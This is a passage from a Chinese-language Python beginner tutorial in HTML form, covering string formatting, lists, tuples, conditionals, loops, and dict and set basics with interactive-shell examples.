class="number">3.1415926</span>)</span><br><span class="line">  <span class="number">3.14</span></span><br></pre></td></tr></table></figure>

<p><code>%s</code>会把任何数据类型转换为字符串：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;Age: %s. Gender: %s&#x27;</span> % (<span class="number">25</span>, <span class="literal">True</span>)</span><br><span class="line"><span class="string">&#x27;Age: 25. Gender: True&#x27;</span></span><br></pre></td></tr></table></figure>

<p>输出<code>%</code>需要转义，用<code>%%</code>来表示一个<code>%</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;growth rate: %d %%&#x27;</span> % <span class="number">7</span></span><br><span class="line"><span class="string">&#x27;growth rate: 7 %&#x27;</span></span><br></pre></td></tr></table></figure>

<p>另一种格式化字符串的方法是使用字符串的<code>format()</code>方法，它会用传入的参数依次替换字符串内的占位符<code>&#123;0&#125;</code>、<code>&#123;1&#125;</code>……，不过这种方式写起来比%要麻烦得多：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;Hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;小明&#x27;</span>, <span class="number">17.125</span>)</span><br><span class="line"><span class="string">&#x27;Hello, 小明, 成绩提升了 17.1%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>最后一种格式化字符串的方法是使用以<code>f</code>开头的字符串，称之为<code>f-string</code>，它和普通字符串不同之处在于，字符串如果包含<code>&#123;xxx&#125;</code>，就会以对应的变量替换：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="number">2.5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="number">3.14</span> * r ** <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(<span class="string">f&#x27;The area of a circle with radius <span class="subst">&#123;r&#125;</span> is <span class="subst">&#123;s:<span class="number">.2</span>f&#125;</span>&#x27;</span>)</span><br><span class="line">The area of a circle <span class="keyword">with</span> radius <span class="number">2.5</span> <span class="keyword">is</span> <span class="number">19.62</span></span><br></pre></td></tr></table></figure>

<p>上述代码中，<code>&#123;r&#125;</code>被变量<code>r</code>的值替换，<code>&#123;s:.2f&#125;</code>被变量<code>s</code>的值替换，并且<code>:</code>后面的<code>.2f</code>指定了格式化参数（即保留两位小数），因此，<code>&#123;s:.2f&#125;</code>的替换结果是<code>19.62</code>。</p>
<h5 id="六、列表和元组"><a href="#六、列表和元组" class="headerlink" title="六、列表和元组"></a>六、列表和元组</h5><h6 id="6-1-list（列表）"><a href="#6-1-list（列表）" class="headerlink" title="6.1 list（列表）"></a>6.1 list（列表）</h6><p>list：python内置的一种数据类型，是一种有序的集合，可以随时添加和删除其中的元素。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters = [<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;sc&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters</span><br><span class="line">[<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;sc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#len()函数：获得list元素个数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span> (sisters) </span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#用索引访问list中每一个位置的元素，从 0 开始。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [<span class="number">0</span>] </span><br><span class="line"><span class="string">&#x27;ll&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [<span class="number">1</span>]</span><br><span class="line"><span class="string">&#x27;lm&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;yz&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;sc&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [<span class="number">4</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">IndexError: <span class="built_in">list</span> index out of <span class="built_in">range</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#用 -1 做索引直接获取最后一个元素。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [-<span class="number">1</span>] </span><br><span class="line"><span class="string">&#x27;sc&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [-<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;yz&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [-<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;lm&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [-<span class="number">4</span>]</span><br><span class="line"><span class="string">&#x27;ll&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [-<span class="number">5</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">IndexError: <span class="built_in">list</span> index out of <span class="built_in">range</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#追加元素到末尾</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters.append (<span class="string">&#x27;gz&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters</span><br><span class="line">[<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;sc&#x27;</span>, <span class="string">&#x27;gz&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#把元素插入到指定的位置，其中 4 是索引位置</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters.insert (<span class="number">4</span>, <span class="string">&#x27;ss&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters</span><br><span class="line">[<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;sc&#x27;</span>, <span class="string">&#x27;ss&#x27;</span>, <span class="string">&#x27;gz&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除list末尾的元素</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters.pop ()</span><br><span class="line"><span class="string">&#x27;gz&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters</span><br><span class="line">[<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;sc&#x27;</span>, <span class="string">&#x27;ss&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除指定位置的元素，其中 4 是索引位置</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters.pop (<span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27;ss&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters</span><br><span class="line">[<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;sc&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#把某个元素替换成别的元素，可以直接赋值给对应的索引位置</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters [<span class="number">3</span>] = <span class="string">&#x27;gz&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters</span><br><span class="line">[<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;gz&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>list里面的元素的数据类型也可以不同，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Q = [<span class="string">&#x27;aaa&#x27;</span>, <span class="number">666</span>, <span class="literal">True</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Q</span><br><span class="line">[<span class="string">&#x27;aaa&#x27;</span>, <span class="number">666</span>, <span class="literal">True</span>]</span><br></pre></td></tr></table></figure>

<p>list元素也可以是另一个list，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>], <span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span> (s)</span><br><span class="line"><span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#拆开</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p = [<span class="string">&#x27;asp&#x27;</span>, <span class="string">&#x27;php&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;java&#x27;</span>, p, <span class="string">&#x27;scheme&#x27;</span>]</span><br><span class="line"><span class="comment">#p[1]和s[2][1]都能表示&#x27;php&#x27;，因此 s 可以看成是一个二维数组。</span></span><br></pre></td></tr></table></figure>

<p>如果一个list中一个元素也没有，就是一个空的list，它的长度为0：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>L = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(L)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>



<h6 id="6-2-tuple（元组）"><a href="#6-2-tuple（元组）" class="headerlink" title="6.2 tuple（元组）"></a>6.2 tuple（元组）</h6><p>tuple：和list非常类似，但是tuple一旦初始化就不能修改。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sisters = (<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;sc&#x27;</span>)</span><br><span class="line"><span class="comment">#tuple没有append()，insert()这样的方法。其他获取元素的方法和list是一样的。</span></span><br></pre></td></tr></table></figure>

<p>因为tuple不可变，所以代码更安全。如果可能，能用tuple代替list就尽量用tuple。</p>
<p>tuple的陷阱：当你定义一个tuple时，在定义的时候，tuple的元素就必须被确定下来，比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#定义一个空的tuple</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = ()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">()</span><br><span class="line"></span><br><span class="line"><span class="comment">#只有1个元素的tuple定义时必须加一个逗号</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="number">1</span>,)</span><br><span class="line"><span class="comment">#Python在显示只有1个元素的tuple时，也会加一个逗号，以免你误解成数学计算意义上的括号。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果不加逗号，定义的不是tuple，是 1 这个数。</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="comment">#因为括号既可以表示tuple，又可以表示数学公式中的小括号，因此，Python规定，这种情况下，按小括号进行计算。</span></span><br></pre></td></tr></table></figure>

<p>”可变的“tuple：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = (<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">2</span>][<span class="number">0</span>] = <span class="string">&#x27;X&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t[<span class="number">2</span>][<span class="number">1</span>] = <span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line">(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, [<span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>定义的时候tuple包含的3个元素：</p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/923973516787680/0" alt="tuple-0"></p>
<p>当我们把list的元素<code>&#39;A&#39;</code>和<code>&#39;B&#39;</code>修改为<code>&#39;X&#39;</code>和<code>&#39;Y&#39;</code>后，tuple变为：</p>
<p><img src="https://www.liaoxuefeng.com/files/attachments/923973647515872/0" alt="tuple-1"></p>
<blockquote>
<p>uple所谓的“不变”是说，tuple的每个元素，指向永远不变。即指向<code>&#39;a&#39;</code>，就不能改成指向<code>&#39;b&#39;</code>，指向一个list，就不能改成指向其他对象，但指向的这个list本身是可变的。</p>
</blockquote>
<h5 id="七、条件判断"><a href="#七、条件判断" class="headerlink" title="七、条件判断"></a>七、条件判断</h5><p><code>if</code>语句完整形式（<code>elif</code>是<code>else if</code>的缩写）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if &lt;条件判断1&gt;:</span><br><span class="line">    &lt;执行1&gt;</span><br><span class="line">elif &lt;条件判断2&gt;:</span><br><span class="line">    &lt;执行2&gt;</span><br><span class="line">elif &lt;条件判断3&gt;:</span><br><span class="line">    &lt;执行3&gt;</span><br><span class="line">else:</span><br><span class="line">    &lt;执行4&gt;</span><br></pre></td></tr></table></figure>

<p><code>if</code>语句执行是从上往下判断，如果在某个判断上是<code>True</code>，把该判断对应的语句执行后，就忽略掉剩下的<code>elif</code>和<code>else</code>。</p>
<p><code>if</code>判断条件还可以简写，比如写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if x:</span><br><span class="line">    print(&#39;True&#39;)</span><br></pre></td></tr></table></figure>

<p>只要<code>x</code>是非零数值、非空字符串、非空list等，就判断为<code>True</code>，否则为<code>False</code>。</p>
<h5 id="八、循环"><a href="#八、循环" class="headerlink" title="八、循环"></a>八、循环</h5><h6 id="8-1-for…in循环"><a href="#8-1-for…in循环" class="headerlink" title="8.1 for…in循环"></a>8.1 for…in循环</h6><p>for…in循环，依次把list或tuple中的每个元素迭代出来：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sisters = [<span class="string">&#x27;ll&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>, <span class="string">&#x27;yz&#x27;</span>, <span class="string">&#x27;sc&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> sister <span class="keyword">in</span> sisters:</span><br><span class="line">	<span class="built_in">print</span> (sister) </span><br></pre></td></tr></table></figure>

<p>执行这段代码，会依次打印<code>sisters</code>的每一个元素：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ll</span><br><span class="line">lm</span><br><span class="line">yz</span><br><span class="line">sc</span><br></pre></td></tr></table></figure>

<p>所以<code>for x in ...</code>循环就是把每个元素代入变量<code>x</code>，然后执行缩进块的语句。</p>
<p>计算1-10的整数之和，可以用一个<code>sum</code>变量做累加：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>]:</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> + x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p>Python提供一个<code>range()</code>函数，可以生成一个整数序列，再通过<code>list()</code>函数可以转换为list。比如<code>range(5)</code>生成的序列是从0开始小于5的整数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">5</span>))</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure>

<p><code>range(101)</code>就可以生成0-100的整数序列，计算如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> + x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>



<h6 id="8-2-while循环"><a href="#8-2-while循环" class="headerlink" title="8.2 while循环"></a>8.2 while循环</h6><p>只要条件满足，就不断循环，条件不满足时退出循环。比如我们要计算100以内所有奇数之和，可以用while循环实现：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">n = <span class="number">99</span></span><br><span class="line"><span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">sum</span> + n</span><br><span class="line">    n = n - <span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p>在循环内部变量<code>n</code>不断自减，直到变为<code>-1</code>时，不再满足while条件，循环退出。</p>
<h6 id="8-3-break"><a href="#8-3-break" class="headerlink" title="8.3 break"></a>8.3 break</h6><p>如果要提前结束循环，可以用<code>break</code>语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> n &lt;= <span class="number">100</span>:</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">10</span>: <span class="comment"># 当n = 11时，条件满足，执行break语句</span></span><br><span class="line">        <span class="keyword">break</span> <span class="comment"># break语句会结束当前循环</span></span><br><span class="line">    <span class="built_in">print</span>(n)</span><br><span class="line">    n = n + <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;END&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h6 id="8-4-continue"><a href="#8-4-continue" class="headerlink" title="8.4 continue"></a>8.4 continue</h6><p>在循环过程中，也可以通过<code>continue</code>语句，提前结束本轮循环，并直接开始下一轮循环。</p>
<p>例如，如果我们想只打印奇数，可以用<code>continue</code>语句跳过某些循环：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> n &lt; <span class="number">10</span>:</span><br><span class="line">    n = n + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>: <span class="comment"># 如果n是偶数，执行continue语句</span></span><br><span class="line">        <span class="keyword">continue</span> <span class="comment"># continue语句会直接继续下一轮循环，后续的print()语句不会执行</span></span><br><span class="line">    <span class="built_in">print</span>(n)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><em>要特别注意</em>，不要滥用<code>break</code>和<code>continue</code>语句。<code>break</code>和<code>continue</code>会造成代码执行逻辑分叉过多，容易出错。大多数循环并不需要用到<code>break</code>和<code>continue</code>语句。</p>
</blockquote>
<h5 id="九、使用dict和set"><a href="#九、使用dict和set" class="headerlink" title="九、使用dict和set"></a>九、使用dict和set</h5><h6 id="9-1-dict"><a href="#9-1-dict" class="headerlink" title="9.1 dict"></a>9.1 dict</h6><p>dict全称dictionary，在其他语言中也称为map，使用键-值（key-value）存储，具有极快的查找速度。</p>
<p>初始化时指定数据放入dict：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = &#123;<span class="string">&#x27;ll&#x27;</span>: <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ymm&#x27;</span>: <span class="string">&#x27;jl&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>: <span class="string">&#x27;cg&#x27;</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s[<span class="string">&#x27;ll&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;dl&#x27;</span></span><br></pre></td></tr></table></figure>

<p>通过key将数据放入dict：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s [<span class="string">&#x27;sc&#x27;</span>] = <span class="string">&#x27;hw&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s [<span class="string">&#x27;sc&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;hw&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s [<span class="string">&#x27;sc&#x27;</span>] = <span class="string">&#x27;hw&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s [<span class="string">&#x27;sc&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;hw&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s [<span class="string">&#x27;sc&#x27;</span>] = <span class="string">&#x27;xe&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s [<span class="string">&#x27;sc&#x27;</span>]</span><br><span class="line"><span class="string">&#x27;xe&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果key不存在，dict就会报错：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s [ym]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;ym&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>

<p>要避免key不存在的错误，有两种办法，一是通过<code>in</code>判断key是否存在：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;ym&#x27;</span> <span class="keyword">in</span> s</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>二是通过dict提供的<code>get()</code>方法，如果key不存在，可以返回<code>None</code>，或者自己指定的value：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.get (<span class="string">&#x27;ym&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.get (<span class="string">&#x27;ym&#x27;</span>, <span class="string">&#x27;who&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;who&#x27;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意：返回<code>None</code>的时候Python的交互环境不显示结果。</p>
</blockquote>
<p>要删除一个key，用<code>pop(key)</code>方法，对应的value也会从dict中删除：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.pop (<span class="string">&#x27;sc&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;xe&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="string">&#x27;ll&#x27;</span>: <span class="string">&#x27;dl&#x27;</span>, <span class="string">&#x27;ymm&#x27;</span>: <span class="string">&#x27;jl&#x27;</span>, <span class="string">&#x27;lm&#x27;</span>: <span class="string">&#x27;cg&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意，dict内部存放的顺序和key放入的顺序是没有关系的。</p>
</blockquote>
<p>和list比较，dict有以下几个特点：</p>
<ol>
<li>查找和插入的速度极快，不会随着key的增加而变慢；</li>
<li>需要占用大量的内存，内存浪费多。</li>
</ol>
<p>而list相反：</p>
<ol>
<li>查找和插入的时间随着元素的增加而增加；</li>
<li>占用空间小，浪费内存很少。</li>
</ol>
<blockquote>
<p>所以，dict是用空间来换取时间的一种方法。</p>
</blockquote>
<p>dict的key必须是<strong>不可变对象</strong>，因为dict根据key来计算value的存储位置，如果每次计算相同的key得出的结果不同，那dict内部就完全混乱了。这种通过key计算位置的算法称为哈希算法（Hash）。</p>
<p>要保证hash的正确性，作为key的对象就不能变。在Python中，字符串、整数等都是不可变的，因此，可以放心地作为key。而list是可变的，就不能作为key：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>key = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[key] = <span class="string">&#x27;a list&#x27;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br></pre></td></tr></table></figure>



<h6 id="9-2-set"><a href="#9-2-set" class="headerlink" title="9.2 set"></a>9.2 set</h6><p>set和dict类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在set中，没有重复的key。</p>
<p>要创建一个set，需要提供一个list作为输入集合：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意，传入的参数<code>[1, 2, 3]</code>是一个list，而显示的<code>&#123;1, 2, 3&#125;</code>只是告诉你这个set内部有1，2，3这3个元素，显示的顺序也不表示set是有序的。</p>
</blockquote>
<p>重复元素在set中自动被过滤：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = <span class="built_in">set</span>([<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>add(key)</code>方法可以添加元素到set中，可以重复添加，但不会有效果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.add(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure>

<p>通过<code>remove(key)</code>方法可以删除元素：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s.remove(<span class="number">4</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>

<p>set可以看成数学意义上的无序和无重复元素的集合，因此，两个set可以做数学意义上的交集、并集等操作：</p>
